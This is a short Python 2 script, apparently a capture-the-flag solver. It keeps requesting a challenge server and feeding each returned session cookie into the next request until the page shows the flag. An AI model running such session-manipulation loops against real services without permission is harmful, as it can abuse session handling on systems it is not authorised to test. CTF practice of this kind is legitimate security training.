# python2
#coding=utf-8
import base64
import requests

cookie=''
while 1:
  res=requests.get('http://cbmctf2019.cf:5001/', cookies=dict(session=cookie))
  print cookie
  if 'ctf' in res.text:
    print res.text
    break
  cookie=res.cookies['session']
